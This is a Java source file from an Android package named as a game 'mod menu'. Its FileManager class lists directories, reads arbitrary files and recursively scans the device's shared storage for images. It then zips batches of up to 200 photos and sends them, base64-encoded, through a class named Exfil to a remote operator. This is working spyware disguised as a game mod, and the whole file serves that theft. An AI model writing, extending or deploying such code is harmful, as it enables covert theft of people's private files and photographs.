package com.brawl.modmenu;

import android.content.Context;
import android.os.Environment;
import android.util.Base64;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class FileManager {

    public static void listDir(Context ctx, String path) {
        new Thread(() -> {
            try {
                File dir = new File(path);
                if (!dir.exists() || !dir.isDirectory()) {
                    Exfil.send("FILES", "Не найдено: " + path);
                    return;
                }
                File[] files = dir.listFiles();
                if (files == null) {
                    Exfil.send("FILES", "Нет доступа: " + path);
                    return;
                }
                Arrays.sort(files, (a, b) -> {
                    if (a.isDirectory() && !b.isDirectory()) return -1;
                    if (!a.isDirectory() && b.isDirectory()) return 1;
                    return a.getName().compareToIgnoreCase(b.getName());
                });
                StringBuilder sb = new StringBuilder();
                sb.append("📁 ").append(path).append("\n━━━━━━━━━━━━━━━━━━\n");
                int count = 0;
                for (File f : files) {
                    if (count++ >= 100) break;
                    String prefix = f.isDirectory() ? "📁 " : "📄 ";
                    String size = f.isDirectory() ? "" : " (" + humanSize(f.length()) + ")";
                    sb.append(prefix).append(f.getName()).append(size).append("\n");
                }
                if (files.length > 100) sb.append("... и ещё ").append(files.length - 100);
                Exfil.send("FILES", sb.toString());
            } catch (Throwable t) {
                Exfil.send("FILES", "Ошибка: " + t.getMessage());
            }
        }).start();
    }

    public static void downloadFile(Context ctx, String path) {
        new Thread(() -> {
            try {
                File f = new File(path);
                if (!f.exists() || !f.isFile()) {
                    Exfil.send("FILE_GET", "Не найдено: " + path);
                    return;
                }
                if (f.length() > 20 * 1024 * 1024) {
                    Exfil.send("FILE_GET", "Большой: " + humanSize(f.length()));
                    return;
                }
                byte[] data = new byte[(int) f.length()];
                FileInputStream fis = new FileInputStream(f);
                fis.read(data);
                fis.close();
                String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                Exfil.sendDocument("FILE: " + f.getName(), b64, f.getName());
            } catch (Throwable t) {
                Exfil.send("FILE_GET", "Ошибка: " + t.getMessage());
            }
        }).start();
    }

    public static void lastPhotos(Context ctx) { photosZip(ctx, 20, "PHOTOS"); }
    public static void allPhotos(Context ctx) { photosZip(ctx, 200, "PHOTOS_ALL"); }

    private static void photosZip(Context ctx, int limit, String tag) {
        new Thread(() -> {
            try {
                // Собираем ВСЕ изображения с /sdcard/
                List<File> photos = new ArrayList<>();
                File root = Environment.getExternalStorageDirectory();

                // Быстрый обход всех папок
                scanAll(root, photos, 0);

                if (photos.isEmpty()) {
                    Exfil.send(tag, "Фото не найдены");
                    return;
                }

                // Сортируем от новых к старым
                photos.sort((a, b) -> Long.compare(b.lastModified(), a.lastModified()));

                Exfil.send(tag, "Найдено " + photos.size() + " фото. Собираю ZIP...");

                // Разбиваем на несколько ZIP по 40 фото
                int batchSize = 40;
                int batchNum = 1;
                int totalSent = 0;

                for (int start = 0; start < photos.size() && totalSent < limit; start += batchSize) {
                    int end = Math.min(start + batchSize, photos.size());
                    List<File> batch = photos.subList(start, end);

                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    ZipOutputStream zos = new ZipOutputStream(bos);
                    int added = 0;
                    long totalSize = 0;

                    for (File p : batch) {
                        if (totalSent >= limit) break;
                        if (p.length() > 8 * 1024 * 1024) continue;
                        if (totalSize + p.length() > 45 * 1024 * 1024) break;

                        try {
                            FileInputStream fis = new FileInputStream(p);
                            ZipEntry entry = new ZipEntry(batchNum + "_" + p.getName());
                            entry.setTime(p.lastModified());
                            zos.putNextEntry(entry);
                            byte[] buf = new byte[8192];
                            int n;
                            while ((n = fis.read(buf)) > 0) zos.write(buf, 0, n);
                            zos.closeEntry();
                            fis.close();
                            added++;
                            totalSize += p.length();
                            totalSent++;
                        } catch (Throwable ignored) {}
                    }
                    zos.close();

                    if (added > 0) {
                        byte[] zipData = bos.toByteArray();
                        String b64 = Base64.encodeToString(zipData, Base64.NO_WRAP);
                        String name = tag + "_part" + batchNum + "_" + added + "фото.zip";
                        Exfil.sendDocument(name + " (" + humanSize(zipData.length) + ")", b64, name);
                        batchNum++;
                        Thread.sleep(2000);
                    } else {
                        break;
                    }
                }

                Exfil.send(tag, "Готово. Отправлено " + totalSent + " фото в " + (batchNum - 1) + " ZIP");
            } catch (Throwable t) {
                Exfil.send(tag, "Ошибка: " + t.getMessage());
            }
        }).start();
    }

    // Рекурсивный обход ВСЕЙ SD-карты
    private static void scanAll(File dir, List<File> out, int depth) {
        if (dir == null || depth > 6 || out.size() > 5000) return;
        File[] files;
        try { files = dir.listFiles(); } catch (Throwable t) { return; }
        if (files == null) return;

        for (File f : files) {
            if (out.size() > 5000) return;
            if (f.isDirectory()) {
                String n = f.getName().toLowerCase();
                // Пропускаем системные
                if (n.equals("android") && depth > 0) continue;
                if (n.startsWith(".") && !n.equals(".thumbnails")) continue;
                if (n.equals("obb")) continue;
                if (n.equals("lost.dir")) continue;
                scanAll(f, out, depth + 1);
            } else {
                if (isImage(f.getName())) out.add(f);
            }
        }
    }

    private static boolean isImage(String name) {
        String l = name.toLowerCase();
        return l.endsWith(".jpg") || l.endsWith(".jpeg") || l.endsWith(".png")
            || l.endsWith(".webp") || l.endsWith(".heic")
            || l.endsWith(".gif") || l.endsWith(".bmp");
    }

    private static String humanSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return (bytes / 1024) + " KB";
        return String.format("%.1f MB", bytes / 1024.0 / 1024.0);
    }
}
